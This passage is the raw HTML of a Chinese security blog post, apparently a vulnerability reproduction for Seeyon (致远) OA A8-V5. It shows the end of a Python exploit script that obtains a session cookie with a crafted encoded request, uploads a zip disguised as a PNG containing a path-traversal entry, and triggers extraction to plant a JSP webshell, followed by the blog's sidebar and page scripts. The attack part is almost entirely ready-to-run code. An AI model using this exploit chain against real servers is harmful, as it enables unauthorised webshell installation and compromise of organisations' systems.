class="string">&#x27;.jsp&#x27;</span></span><br><span class="line">webshell_name2 = <span class="string">&#x27;../&#x27;</span>+webshell_name1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_zip</span>():</span></span><br><span class="line">    shell = <span class="string">&#x27;test&#x27;</span>   <span class="comment">## 替换shell内容</span></span><br><span class="line">    zf = zipfile.ZipFile(mm+<span class="string">&#x27;.zip&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>, compression=zipfile.ZIP_DEFLATED)</span><br><span class="line">    zf.writestr(<span class="string">&#x27;layout.xml&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    zf.writestr(webshell_name2, shell)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Seeyon_Getshell</span>(<span class="params">urllist</span>):</span></span><br><span class="line"></span><br><span class="line">    url = urllist+<span class="string">&#x27;/seeyon/thirdpartyController.do&#x27;</span></span><br><span class="line">    post = <span class="string">&quot;method=access&amp;enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&amp;clientPath=127.0.0.1&quot;</span></span><br><span class="line">    response = requests.post(url=url, data=post, headers=la)</span><br><span class="line">    <span class="keyword">if</span> response <span class="keyword">and</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;set-cookie&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(response.headers).lower():</span><br><span class="line">        cookie = response.cookies</span><br><span class="line">        cookies = requests.utils.dict_from_cookiejar(cookie)</span><br><span class="line">        jsessionid = cookies[<span class="string">&#x27;JSESSIONID&#x27;</span>]</span><br><span class="line">        file_zip()</span><br><span class="line">        print( <span class="string">&#x27;获取cookie成功----&gt;&gt; &#x27;</span>+jsessionid)</span><br><span class="line">        fileurl = urllist+<span class="string">&#x27;/seeyon/fileUpload.do?method=processUpload&amp;maxSize=&#x27;</span></span><br><span class="line">        headersfile = &#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&quot;JSESSIONID=%s&quot;</span> % jsessionid&#125;</span><br><span class="line">        post = &#123;<span class="string">&#x27;callMethod&#x27;</span>: <span class="string">&#x27;resizeLayout&#x27;</span>, <span class="string">&#x27;firstSave&#x27;</span>: <span class="string">&quot;true&quot;</span>, <span class="string">&#x27;takeOver&#x27;</span>: <span class="string">&quot;false&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;isEncrypt&#x27;</span>: <span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">        file = [(<span class="string">&#x27;file1&#x27;</span>, (<span class="string">&#x27;test.png&#x27;</span>, <span class="built_in">open</span>(mm+<span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line">        filego = requests.post(url=fileurl,data=post,files=file, headers=headersfile)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;获取cookie失败&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> filego.text:</span><br><span class="line">        fileid1 = re.findall(<span class="string">&#x27;fileurls=fileurls\+&quot;,&quot;\+\&#x27;(.+)\&#x27;&#x27;</span>, filego.text, re.I)</span><br><span class="line">        fileid = fileid1[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(fileid1) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&#x27;未获取到文件id可能上传失败！&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;上传成功文件id为----&gt;&gt;:&#x27;</span>+fileid)</span><br><span class="line">        Date_time = time.strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>)</span><br><span class="line">        headersfile2 = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&quot;JSESSIONID=%s&quot;</span> % jsessionid&#125;</span><br><span class="line">        getshellurl = urllist+<span class="string">&#x27;/seeyon/ajax.do&#x27;</span></span><br><span class="line">        data = <span class="string">&#x27;method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=uploadPageLayoutAttachment&amp;arguments=%5B0%2C%22&#x27;</span> + Date_time + <span class="string">&#x27;%22%2C%22&#x27;</span> + fileid + <span class="string">&#x27;%22%5D&#x27;</span></span><br><span class="line">        getshell = requests.post(url=getshellurl,data=data,headers=headersfile2)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        webshellurl1 = urllist + <span class="string">&#x27;/seeyon/common/designer/pageLayout/&#x27;</span> + webshell_name1</span><br><span class="line">        shelllist = requests.get(url=webshellurl1)</span><br><span class="line">        <span class="keyword">if</span> shelllist.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&#x27;利用成功webshell地址：&#x27;</span>+webshellurl1)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;未找到webshell利用失败&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) == <span class="number">2</span>):</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        Seeyon_Getshell(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;python3 Seeyon_Getshell.py http://xx.xx.xx.xx&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Li qun</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.ailiqun.xyz/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/">https://www.ailiqun.xyz/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.ailiqun.xyz" target="_blank">Liqun</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><a class="post-meta__tags" href="/tags/%E8%87%B4%E8%BF%9Coa/">致远oa</a></div><div class="post_share"><div class="social-share" data-image="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post2.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/wechat.webp" target="_blank"><img class="post-qr-code-img" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/wechat.webp" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/alipay.webp" target="_blank"><img class="post-qr-code-img" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/alipay.webp" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/13/%E7%BD%91%E5%BA%B7%E9%98%B2%E7%81%AB%E5%A2%99-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><img class="prev-cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">网康下一代防火墙   命令执行</div></div></a></div><div class="next-post pull-right"><a href="/2021/04/10/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><img class="next-cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post4.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">亿邮电子邮件系统 命令执行</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/06/05/H3C-IMC-命令执行/" title="H3C IMC 命令执行"><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post6.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-05</div><div class="title">H3C IMC 命令执行</div></div></a></div><div><a href="/2021/06/05/用友NC-rce/" title="用友NC BshServlet 命令执行"><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-05</div><div class="title">用友NC BshServlet 命令执行</div></div></a></div><div><a href="/2021/05/20/某0A-全版本getshell/" title="某0A 全版本getshell"><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post7.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-20</div><div class="title">某0A 全版本getshell</div></div></a></div><div><a href="/2021/05/20/某OA-任意用户登录/" title="某OA 任意用户登录"><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post4.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-20</div><div class="title">某OA 任意用户登录</div></div></a></div><div><a href="/2021/05/15/蓝凌oa-密码读取rce/" title="蓝凌oa 密码读取rce"><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post1.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-15</div><div class="title">蓝凌oa 密码读取rce</div></div></a></div><div><a href="/2021/05/02/泛微OA-前台GetShell复现/" title="泛微OA 前台GetShell复现"><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post7.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-02</div><div class="title">泛微OA 前台GetShell复现</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/txx.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Li qun</div><div class="author-info__description">ailiqun.xyz@gmail.com</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ailiqun.xyz@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">你总是来去如风 <img src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/xx.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%89%88%E6%9C%AC%E4%B8%BA%EF%BC%9A-%E8%87%B4%E8%BF%9CA8-V5%E5%8D%8F%E5%90%8C%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6-V6-1SP2"><span class="toc-number">1.</span> <span class="toc-text">测试版本为： 致远A8-V5协同管理软件 V6.1SP2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E8%A1%8C%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">自行搭建环境：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getshell%E5%88%86%E4%B8%89%E6%AD%A5"><span class="toc-number">1.2.</span> <span class="toc-text">Getshell分三步</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96cookie%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.1.</span> <span class="toc-text">获取cookie信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.2.</span> <span class="toc-text">上传压缩文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%BE%97%E5%88%B0shell"><span class="toc-number">1.3.</span> <span class="toc-text">3.解压文件得到shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%BB%93%E6%9E%9C"><span class="toc-number">2.</span> <span class="toc-text">验证结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%EF%BC%9A%E5%88%B6%E4%BD%9Czip%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">注：制作zip文件</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/" title="在线工具汇总"><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post1.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="在线工具汇总"/></a><div class="content"><a class="title" href="/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/" title="在线工具汇总">在线工具汇总</a><time datetime="2022-07-24T12:13:00.000Z" title="发表于 2022-07-24 20:13:00">2022-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/05/H3C-IMC-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="H3C IMC 命令执行"><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post6.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="H3C IMC 命令执行"/></a><div class="content"><a class="title" href="/2021/06/05/H3C-IMC-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="H3C IMC 命令执行">H3C IMC 命令执行</a><time datetime="2021-06-05T14:23:00.000Z" title="发表于 2021-06-05 22:23:00">2021-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/05/%E7%94%A8%E5%8F%8BNC-rce/" title="用友NC BshServlet 命令执行"><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="用友NC BshServlet 命令执行"/></a><div class="content"><a class="title" href="/2021/06/05/%E7%94%A8%E5%8F%8BNC-rce/" title="用友NC BshServlet 命令执行">用友NC BshServlet 命令执行</a><time datetime="2021-06-05T13:21:00.000Z" title="发表于 2021-06-05 21:21:00">2021-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/20/%E6%9F%900A-%E5%85%A8%E7%89%88%E6%9C%ACgetshell/" title="某0A 全版本getshell"><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post7.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某0A 全版本getshell"/></a><div class="content"><a class="title" href="/2021/05/20/%E6%9F%900A-%E5%85%A8%E7%89%88%E6%9C%ACgetshell/" title="某0A 全版本getshell">某0A 全版本getshell</a><time datetime="2021-05-20T08:11:00.000Z" title="发表于 2021-05-20 16:11:00">2021-05-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/20/%E6%9F%90OA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/" title="某OA 任意用户登录"><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某OA 任意用户登录"/></a><div class="content"><a class="title" href="/2021/05/20/%E6%9F%90OA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/" title="某OA 任意用户登录">某OA 任意用户登录</a><time datetime="2021-05-20T08:10:00.000Z" title="发表于 2021-05-20 16:10:00">2021-05-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Li qun</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/js/utils.js"></script><script src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/js/search/local-search.js"></script><div class="js-pjax"><script async="async">var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})
+setTimeout(function(){preloader.endLoading();}, 3000);</script></div><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'LHEeV46JNDnW2PY1KjVTLy2J-MdYXbMMI',
+      appKey: 'XESiWusPnVBEz6s4AhXF6ONB',
+      placeholder: '说点什么吗',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-cn',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="/js/订阅.js"></script><script src="https://cdn1.lncld.net/static/js/3.5.0/av-min.js"></script><script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script><script src='/js/动态标题.js'></script><script src="//lib.baomitu.com/jquery/3.3.1/jquery.min.js"></script><script src="https://myhkw.cn/api/player/1613835026120" id="myhk" key="1613835026120" m="1"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="暴富" data-fontsize="15px" data-random="false" async="async"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  if (typeof gtag === 'function') {
+    gtag('config', '', {'page_path': window.location.pathname});
+  }
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+
+document.addEventListener('pjax:send', function () {
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script><script>(function (w, d, s, id) {
+            if (typeof (w.webpushr) !== 'undefined') return; w.webpushr = w.webpushr || function () { (w.webpushr.q = w.webpushr.q || []).push(arguments) }; var js, fjs = d.getElementsByTagName(s)[0]; js = d.createElement(s); js.id = id; js.async = 1; js.src = "https://cdn.webpushr.com/app.min.js";fjs.parentNode.appendChild(js);}(window, document, 'script', 'webpushr-jssdk'));webpushr('setup', { 'key': 'BKlorLZnBq1iMFfk3xnjGJjBLNqEm1J1Bi-iRHabMhNYHjT46u-7wQUWjEMij1R6p1CyK6GjOAizKFpbF9XDjYU' });</script></body></html>
